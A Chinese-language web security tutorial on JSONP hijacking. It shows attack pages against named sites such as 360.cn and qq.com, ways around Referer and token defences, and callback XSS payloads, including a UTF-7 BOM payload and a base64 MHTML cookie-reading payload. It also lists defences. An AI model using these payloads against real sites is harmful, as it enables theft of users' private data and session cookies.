# JSON劫持

> JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。
>
> 他实现的基本原理是利用了 HTML 里 元素标签，远程调用 JSON 文件来实现数据传递。
>
> 然而，安全问题一直都是伴随着业务发展而出现的，JSONP 的出现同样带来了各种各样的安全问题。

JSON 劫持,其实这个属于CSRF攻击范畴。当某网站通过过 JSONP 的方式来跨域传递用户认证后的敏感信息时，

攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。

一个典型的 JSON Hijacking 攻击代码：

    <script>
    function wooyun(v){
        alert(v.username);
    }
    </script>
    <script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script>

这个是在乌云网上报告的一个攻击例子，当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持。

## WAF绕过

以下的方式是单纯的针对“ JSON 劫持”本身的来展开的各种攻防战。

但是在现实里，很多漏洞是配合组合来实现突破的，比如通过限制 Referer+ 部署随机 token 来防止JSON劫持，看起来无懈可击！

但是只要在该网站上出现一个 XSS 漏洞，那么利用这个 XSS 漏洞可能让你的防御体系瞬间崩溃！

另外这里顺带提一点：以上的方法是一些通用实现“ JSON 劫持”的方法，

但是现实中某些浏览器的一些特有的处理机制（如 CSS 加载，错误信息显示等），导致一些类似“ JSON 劫持”（攻击对象不一定是 JSON ）的攻击！


### Referer验证

#### Referer 过滤（正则）不严谨

比如 `http://www.qq.com/login.php?calback=cb` 输出数据时,使用了 Referer 过滤。但是可惜过滤的时候只过滤了 Referer 里是否存在 qq.com 这样的关键词，

那么攻击者可以听过构造 URL：`http://www.qq.com.attack.com/attack.htm` 或者 `http://www.attack.com/attack.htm?qq.com`

这样的页面来发起攻击实现绕过 Referer 防御。

#### 空 Referer

在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。

一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。

因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！

跨协议调用的一个简单例子：

    <iframe src="javascript:'<script>function JSON(o){alert(o.userinfo.userid);}</script><script src=http://www.qq.com/login.php?calback=JSON></script>'"></iframe>

代码里我们使用 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。

### 随机token

#### token可爆破

另外一种防御手段就是通过随机 token 来防御，这个技术在 qq 的网站上应用比较多，

如：`http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=[QQ号码]&g_tk=[随机token]` 来输出 JSON ，同样这个方案也是效的，

但是同样可以出现防御实现的不严谨问题。如这个 token 可以暴力。如：

    function _Callback(o) {
        alert(o.items[0].uin);
    }
    for (i = 17008; i < 17009; i++) { //暴力循环调用
        getJSON("http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&g_tk=" + i);
    }

## Callback 可定义导致的安全问题

### Content-Type 与 XSS 漏洞

在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）

然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞

    http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script>

对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript 而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。

#### 防御

##### 严格定义 Content-Type: application / json

这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。

但是凡事都有个案，

在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，

比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback= ）

##### 过滤 callback函数名 以及 JSON 数据输出

这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。

又是一个看上去很完美的解决方案，但是往往都是“事与愿违”。2011 年一个 utf7-BOM 就复活了 n 个 XSS 漏洞。

这种攻击方式主要还是存在于 IE 里(注在 IE 较新版本里已经“修复”) 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， 

IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：

    http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA
    8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApA
    DsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHk
    APgA8AC8AaAB0AG0APg-%20

其中：

    %2B%2Fv8
    %20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAY
    wByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAv
    AHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8
    AaAB0AG0APg-%20

URLdecode 为：

    +/v8
    +ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAY
    wByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADs
    APAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkA
    HkAPgA8AC8AaAB0AG0APg-

其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：

    <htm><body><script>alert(1);</script></body></htm>

这次利用 utf7-BOM 的方法是一个非常有代表性的通用方法，IE 后面的升级也是做一定的防御，

另外在开发者角度也给出了防御方法直接强制指定 Content-Type里的编码 ( Content-Type: application/json; charset=utf-8 ) 

对于现在的浏览器上，虽然没有比较通用的技巧，但是对于开发者本事过滤的机制一样可能存在各种绕过的可能。

##### 严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等

##### 严格限制对 JSONP 输出 callback 函数名的长度

##### 其他

其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。

还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。

## 其他文件格式（ Content-Type ）与 JSON

### MHTML 与 JSONP

在 2011 年 IE 曾经出现过一个听过 mhtml 协议解析跨域的漏洞：一个常见利用就是利用 JSONP 调用机制里的 Callback 函数名输出点：

    <iframe src="mhtml:http://127.0.0.1/getUsers.php?callback=Content-Type%3A%20multipart%2Frelated%3B%20boundary%3D_boundary_by_mere%0D%0A%0D%0A--_boundary_by_mere%0D%0AContent-Location%3Acookie%0D%0AContent-Transfer-
    Encoding%3Abase64%0D%0A%0D%0APGJvZHk%2BDQo8aWZyYW1lIGlkPWlmciBzcmM9Imh0dHA6Ly93d3cuODB2d
    WwuY29tLyI%2BPC9pZnJhbWU%2BDQo8c2NyaXB0Pg0KYWxlcnQoZG9jdW1lbnQuY29va2ll
    KTsNCmZ1bmN0aW9uIGNyb3NzY
    29va2llKCl7DQppZnIgPSBpZnIuY29udGVudFdpbmRvdyA%2FIGlmci5jb250ZW50V2luZG93I
    DogaWZyLmNvbnRlbnREb2N1bWVudDsNCmFsZXJ0KGlmci5
    kb2N1bWVudC5jb29raWUpDQp9DQpzZXRUaW1lb3V0KCJjc
    m9zc2Nvb2tpZSgpIiwxMDAwKTsNC
    jwvc2NyaXB0PjwvYm9keT4NCg%3D%3D%0D%0A--_boundary_by_mere--%0D%0A!cookie"></iframe>


这个点就充分利用了 callback 输出点直接输出一个 mhtml 文件格式，然后利用 调用 mhtml 标签解析并执行 html 及 javascript 代码，

这也就是一个通用性的 XSS 漏洞，随后微软紧急推出了解决方案及漏洞补丁程序！

而对于开发者防御而已在微软推出安全补丁之前这个漏洞影响 Google 等国际大型网站，到时 Google 为了防御这类补丁，

启用的防御措施是，在 JSON 输出 callback 时，在文件开头增加了多个换行回车让远程 mhtml 调用时解析失败。

在攻击角度来说，这个充分利用了计算机体系里各种文件格式识别机制，

这个也和 Callback 直接在 json 文件开头输出的突然优势！

在这个思维的引导下，后面还出现各种各样的文件格式加载带来的安全问题，

比如 CSS 文件格式加载导致的类“ JSON 劫持”的安全问题、JS 加载及各种文件格式编码带来的安全问题等等。

历史进程里往往会出现各种惊人的相识，JSONP 与文件格式的各种传奇还在上演…
